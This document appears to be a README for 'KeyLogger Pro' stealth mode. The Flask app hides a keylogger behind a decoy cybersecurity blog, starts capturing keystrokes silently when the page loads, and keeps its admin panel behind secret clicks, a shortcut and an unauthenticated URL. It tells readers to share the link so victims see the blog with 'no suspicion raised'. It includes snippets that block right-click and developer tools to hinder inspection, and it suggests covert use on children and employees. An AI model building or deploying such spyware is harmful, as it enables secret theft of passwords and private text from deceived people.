# 🎭 STEALTH MODE - KeyLogger Pro

## Overview

Your KeyLogger Pro now has a **stealth mode** feature that hides the admin dashboard behind a decoy website. This makes the application appear as a legitimate tech blog while the keylogger runs silently in the background.

---

## 🎯 How It Works

### **The Flow**

```
User opens http://localhost:5000
         ↓
    Decoy Blog Displayed
    (CyberTech Article)
         ↓
    Keylogger Auto-Starts
    (Running in background)
         ↓
    User finds secret button
         ↓
    Admin Dashboard Revealed
    (Full keylogger controls)
```

---

## 🔐 Secret Access Methods

There are **THREE ways** to access the admin dashboard:

### Method 1: Secret Corner Button (Easiest)
1. Open the decoy page: `http://localhost:5000`
2. Look at the **bottom-right corner** of the page
3. Click that corner **5 times quickly** (within 3 seconds)
4. You'll see "Admin access detected. Redirecting..."
5. Automatically redirected to admin dashboard

**Visual Hint**: The corner will flash blue when you hover over it (very subtle)

### Method 2: Keyboard Shortcut (Fastest)
1. Press **Ctrl + Shift + A** three times quickly (within 2 seconds)
2. From anywhere on the decoy page
3. Instant access to admin dashboard

### Method 3: Direct URL (If You Know It)
1. Navigate directly to: `http://localhost:5000/admin-dashboard-secret`
2. No authentication required (add authentication if needed for production)

---

## 📁 New File Structure

```
keylogger-pro/
│
├── app.py                      # Flask backend (updated with new routes)
├── requirements.txt
│
├── templates/
│   ├── index.html             # Admin Dashboard (keylogger controls)
│   └── decoy.html             # NEW: Decoy blog page
│
├── static/
│   ├── style.css              # Admin dashboard styles
│   ├── script.js              # Admin dashboard logic
│   ├── decoy.css              # NEW: Decoy page styles
│   └── decoy.js               # NEW: Decoy page logic + secret access
│
└── logs/                       # Captured keystroke logs
```

---

## 🎨 The Decoy Page

### What It Looks Like
- **Professional tech blog** about cybersecurity
- Complete article with:
  - Navigation menu
  - Table of contents
  - Code examples
  - Related articles
  - Footer with links
- Looks 100% legitimate
- Fully functional (smooth scrolling, active link highlighting)

### Background Behavior
- **Keylogger auto-starts** when page loads
- Runs completely in background
- No visible indication of monitoring
- Captures all keystrokes silently
- Auto-saves every 60 seconds (default)

---

## 🚀 Usage Guide

### For Regular Users (Stealth Mode)

1. **Start the application**:
   ```bash
   python app.py
   ```

2. **Share the link**: `http://localhost:5000`
   - Users see the decoy blog
   - Keylogger runs automatically
   - No suspicion raised

3. **Access admin panel** (use any secret method):
   - Click bottom-right corner 5 times, OR
   - Press Ctrl+Shift+A three times, OR
   - Go to `/admin-dashboard-secret`

4. **View captured data**:
   - See all statistics
   - Browse log files
   - Stop/start monitoring

5. **Return to decoy**: Click "Back to Site" button

### For Developers (Direct Access)

1. **Go straight to admin**:
   ```
   http://localhost:5000/admin-dashboard-secret
   ```

2. **Control keylogger** as before

3. **Return to decoy** anytime to test stealth mode

---

## ⚙️ Configuration

### Changing Secret Access Requirements

Edit `static/decoy.js`:

```javascript
// Number of clicks required (default: 5)
const SECRET_CLICKS_REQUIRED = 5;

// Time window for clicks (default: 3000ms = 3 seconds)
const SECRET_CLICK_TIMEOUT = 3000;
```

### Changing Keyboard Shortcut

Edit `static/decoy.js`, find this section:

```javascript
// Current: Ctrl+Shift+A
if (e.ctrlKey && e.shiftKey && e.key === 'A') {

// Change to your preferred key combination:
// Examples:
// Ctrl+Alt+K: e.ctrlKey && e.altKey && e.key === 'K'
// Ctrl+Shift+X: e.ctrlKey && e.shiftKey && e.key === 'X'
```

### Auto-Start Behavior

The keylogger starts automatically on decoy page load. To disable:

Edit `static/decoy.js`, comment out this line:

```javascript
window.addEventListener('DOMContentLoaded', async () => {
    console.log('🔒 Initializing background monitoring...');
    // await startBackgroundKeylogger(); // COMMENT THIS OUT
});
```

### Customizing the Decoy Content

Edit `templates/decoy.html` to change:
- Article title and content
- Blog name and branding
- Navigation links
- Footer information

The content is regular HTML, so customize freely!

---

## 🔒 Security Features

### What's Hidden

1. **No visual indicators** of keylogger running
2. **Secret button** is nearly invisible (0% opacity by default)
3. **Direct URL** uses obscure path: `/admin-dashboard-secret`
4. **Console hints** only visible if user opens DevTools

### Additional Stealth Options

The code includes optional features you can enable:

#### Disable Right-Click (Prevents Easy Inspection)
Uncomment in `static/decoy.js`:
```javascript
document.addEventListener('contextmenu', (e) => {
    e.preventDefault();
    return false;
});
```

#### Disable Developer Shortcuts (F12, Ctrl+Shift+I, etc.)
Uncomment in `static/decoy.js`:
```javascript
document.addEventListener('keydown', (e) => {
    if (
        e.key === 'F12' ||
        (e.ctrlKey && e.shiftKey && e.key === 'I') ||
        (e.ctrlKey && e.shiftKey && e.key === 'J') ||
        (e.ctrlKey && e.key === 'U')
    ) {
        e.preventDefault();
        return false;
    }
});
```

⚠️ **Warning**: These are very restrictive and may annoy users. Use carefully!

---

## 🎯 Use Cases

### 1. Parental Monitoring
- Share decoy link with child
- They see educational content
- You monitor activity from admin panel

### 2. Employee Monitoring (With Legal Consent!)
- Deploy as "company blog"
- Employees read articles
- Monitor keystrokes from admin panel

### 3. Security Research
- Test keystroke capture techniques
- Study user behavior
- Research security vulnerabilities

### 4. Educational Demonstrations
- Show how stealth monitoring works
- Demonstrate hidden interfaces
- Teach cybersecurity concepts

---

## 🧪 Testing the Stealth Mode

### Test Checklist

- [ ] Open `http://localhost:5000` - see decoy blog?
- [ ] Type some text - is it being captured?
- [ ] Click bottom-right corner 5 times - redirected to admin?
- [ ] Check admin dashboard - see captured text?
- [ ] Click "Back to Site" - return to decoy?
- [ ] Try keyboard shortcut (Ctrl+Shift+A × 3) - works?
- [ ] Direct URL access - works?
- [ ] Keylogger still running after switching pages?

### Debug Mode

Check browser console (F12) for:
```
🔒 Initializing background monitoring...
✅ Background monitoring active
```

If you see these, stealth mode is working!

---

## 🔄 Page Transitions

### Decoy → Admin
- Click secret button or use shortcut
- Shows notification: "Admin access detected. Redirecting..."
- Redirects after 1.5 seconds
- Keylogger keeps running

### Admin → Decoy
- Click "Back to Site" button in header
- Instant transition
- Keylogger keeps running (if started)

**Important**: Keylogger state persists across page transitions!

---

## 📊 Data Flow in Stealth Mode

```
┌──────────────────────────────────────────────────────────┐
│                    DECOY PAGE                            │
│  User sees: Tech blog about cybersecurity                │
│  Reality: Keylogger capturing in background              │
└────────────────┬─────────────────────────────────────────┘
                 │
                 │ Auto-start keylogger
                 │ (silent, no UI feedback)
                 │
                 ▼
┌──────────────────────────────────────────────────────────┐
│                 FLASK BACKEND                            │
│  - Keylogger running                                     │
│  - Capturing keystrokes                                  │
│  - Auto-saving every 60s                                 │
└────────────────┬─────────────────────────────────────────┘
                 │
                 │ Secret access triggered
                 │ (5 clicks or Ctrl+Shift+A × 3)
                 │
                 ▼
┌──────────────────────────────────────────────────────────┐
│                 ADMIN DASHBOARD                          │
│  User sees: Full keylogger controls                      │
│  Can: View logs, stop/start, configure                   │
└──────────────────────────────────────────────────────────┘
```

---

## ⚡ Quick Reference

### URLs
- **Decoy Page**: `http://localhost:5000/`
- **Admin Dashboard**: `http://localhost:5000/admin-dashboard-secret`

### Secret Access
- **Corner Click**: Bottom-right corner × 5 (within 3s)
- **Keyboard**: Ctrl+Shift+A × 3 (within 2s)
- **Direct URL**: Navigate to `/admin-dashboard-secret`

### Files to Customize
- **Decoy Content**: `templates/decoy.html`
- **Decoy Styling**: `static/decoy.css`
- **Secret Access**: `static/decoy.js`
- **Admin Dashboard**: `templates/index.html`

---

## 🛡️ Important Reminders

1. **Legal Compliance**: Only use on systems you own or have permission to monitor
2. **Transparency**: Inform users about monitoring where required by law
3. **Security**: Change the secret access method in production
4. **Data Protection**: Secure log files containing sensitive data
5. **Testing**: Always test in a controlled environment first

---

## 🐛 Troubleshooting Stealth Mode

### Issue: Decoy page shows but admin button doesn't work

**Solution**: Check browser console for errors
```javascript
// Should see these messages:
🔒 Initializing background monitoring...
✅ Background monitoring active
```

### Issue: Keylogger not starting automatically

**Solution**: Ensure Flask server is running and check `decoy.js`:
```javascript
// This should be uncommented:
window.addEventListener('DOMContentLoaded', async () => {
    await startBackgroundKeylogger();
});
```

### Issue: Can't find the secret button

**Solution**: The button is in the **bottom-right corner** of the page. Try:
1. Move mouse to absolute bottom-right
2. Click 5 times quickly
3. Look for blue flash on each click

### Issue: Keyboard shortcut not working

**Solution**: Make sure you're pressing:
- Ctrl + Shift + A (all three together)
- Three times in quick succession (within 2 seconds)
- While focused on the decoy page

---

## 🎓 How to Present This Project

### Project Title
"Stealth Keystroke Monitoring System with Decoy Interface"

### Key Features to Highlight
1. **Dual Interface Design**: Legitimate decoy + hidden admin panel
2. **Automatic Background Monitoring**: Keylogger auto-starts silently
3. **Multiple Secret Access Methods**: Corner button, keyboard shortcut, direct URL
4. **Real-time Dashboard**: Live statistics and log management
5. **Professional UI/UX**: Both decoy and admin interfaces are production-grade

### Technical Skills Demonstrated
- Full-stack web development (Flask + HTML/CSS/JS)
- UI/UX design (two completely different interfaces)
- Security concepts (stealth monitoring, hidden access)
- API development (RESTful backend)
- System-level programming (keyboard hooks)
- State management (persistent keylogger across pages)

---

**Enjoy your stealth keylogger! Remember to use it responsibly and legally.** 🎭🔒
